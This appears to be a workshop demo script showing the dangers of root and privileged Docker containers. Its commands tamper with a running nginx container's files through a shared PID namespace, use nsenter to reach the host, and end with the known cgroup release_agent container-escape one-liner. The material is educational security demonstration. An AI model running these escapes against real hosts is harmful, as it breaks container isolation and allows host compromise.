# Example 5 - Root user 
Demonstrate root user inside the container. 

## Script to follow
Demonstrate root user

Build the image
```sh
docker build --no-cache -t scratchtest .
```

Run as non-privileged 
```sh
docker run -it --rm --entrypoint "/bin/bash" scratchtest
whoami
exit
```

Run as privileged
```sh
docker run -it --rm --privileged --entrypoint "/bin/bash" scratchtest
whoami
exit
```

Start an nginx container
```sh
docker run --rm --name mynginx -p 8080:80 -d nginx 
open http://localhost:8080/
docker run -it --rm --privileged --pid=container:$(docker ps --filter name=mynginx -q) --entrypoint "/bin/bash" scratchtest

# Change the nginx static file
cat /proc/1/root/etc/nginx/nginx.conf
cat /proc/1/root/etc/nginx/conf.d/default.conf
apt update
apt install nano
# edit the <h1>Welcome to hacked nginx!</h1>
nano /proc/1/root/usr/share/nginx/html/index.html
cat /proc/1/root/usr/share/nginx/html/index.html

open http://localhost:8080/
```

Changing and reloading config
```sh
# We should also be able to change config and reload 
docker exec -it $(docker ps --filter name=mynginx -q) nginx -s reload  
docker stop mynginx 
```

## Get onto the docker desktop host
```sh
docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

## Escape the container
[understanding-docker-container-escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)  
```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps -aux >'"$t/o" >/c;
chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```